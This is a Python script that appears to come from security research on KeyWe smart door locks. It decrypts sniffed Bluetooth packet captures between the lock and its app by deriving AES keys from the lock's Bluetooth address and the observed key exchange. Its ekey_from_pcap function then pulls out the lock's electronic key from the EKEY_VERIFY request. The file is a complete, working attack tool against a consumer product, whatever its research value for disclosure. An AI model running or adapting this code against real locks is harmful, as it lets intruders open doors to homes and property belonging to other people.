#!/usr/bin/env python
from binascii import hexlify
from binascii import unhexlify
from string import printable
import sys

from Crypto.Cipher import AES
from scapy.all import rdpcap

from pykeywe.keys import make_common_key
from pykeywe.keys import make_app_key
from pykeywe.keys import make_door_key

MAX_PACKET_LEN      = 16
PAYLOAD_OFFSET      = 30
DIRECTION_TO_APP    = 0x03

def dump_hex(s):
    ss = hexlify(s)
    return b' '.join([ss[i:i+2] for i in range(0,len(ss),2)]).decode('ascii')

def print_ascii(s, prefix):
    p = printable[:-6].encode('ascii')
    print(
        prefix + '  '.join(
            [chr(c) if c in p else '.' for c in s]
        )
    )

common_key  = make_common_key(b'8c:c8:f4:0f:eb:81') # default in case no addr is provided

common_crypt    = AES.new(common_key, AES.MODE_ECB)

cipher = (None,None)
ctr = 0

def process_packet(pkt, new_keys, debug=False):
    direction = pkt[8] != DIRECTION_TO_APP
    content = pkt[PAYLOAD_OFFSET:]

    if len(content)-3 == MAX_PACKET_LEN:
        decrypted = common_crypt.decrypt(content[:-3])
        # if 12 bytes are used (4 are \x00 )
        # then it's app_num or door_num
        if decrypted[-4:] != b'\x00'*4:
            # choose key based on the comm direction
            # 0x03: it's app -> lock (app key)
            # otherwise it's lock -> app (lock key)
            decrypted = cipher[direction].decrypt(content[:-3])
            if decrypted[2] == 0x02:
                decrypted = decrypted[2:]
    else:
        decrypted = content + b'\x00' * (MAX_PACKET_LEN - len(content))

    if debug:
        print(' {:03d} |  app {} lock  |  {}'.format(
            idx,
            '->' if not direction else '<-', 
            dump_hex(decrypted)
        ))
        print_ascii(decrypted, '-----+---------------+- ')
    else:
        return decrypted

nums = [None,None]

# check if another key exchange happened in the meantime
def check_new_keys(idx):
    global cipher
    # try to decrypt a packet pair using the common key
    p = [common_crypt.decrypt(bytes(pkt)[PAYLOAD_OFFSET:-3]) for pkt in [packets[idx-1], packets[idx]]]
    # make sure we have both app_num and door_num
    # if true, we caught the new key exchange
    if all([p[i][-4:] == b'\x00'*4 for i in [0,1]]):
        keys = [make_app_key(*p), make_door_key(*p)]
        cipher = [AES.new(key, AES.MODE_ECB) for key in keys]
        return True
    return False

def ekey_from_pcap(pcap, lock_bdaddr):
    global common_crypt
    lock_bdaddr = lock_bdaddr.encode('ascii') if type(lock_bdaddr) != bytes else lock_bdaddr
    common_crypt = AES.new(
        make_common_key(lock_bdaddr),
        AES.MODE_ECB
    )
    global packets
    # don't ask me why 49, I have no idea myself; chosen experimentally :P
    packets = [p for p in rdpcap(pcap) if len(bytes(p)) == 49]
    for idx in range(0, len(packets)):
        pkt = packets[idx]
        new_keys = False
        if idx > 0:
            new_keys = check_new_keys(idx)
        pkt = process_packet(bytes(pkt), new_keys)
        if not pkt:
            continue
        if pkt[2] == 0x30 and pkt[1] == 0x09:  # EKEY_VERIFY req
            return pkt[3:9]

    return None

if __name__ == '__main__':
    packets = rdpcap(sys.argv[1])

    print(' idx |   direction   |                  packet dump')
    print('-----+---------------+-------------------------------------------------')
    for idx in range(0, len(packets)):
        pkt = packets[idx]
        new_keys = False
        if idx > 0:
            new_keys = check_new_keys(idx)

        process_packet(bytes(pkt), new_keys, debug=True)

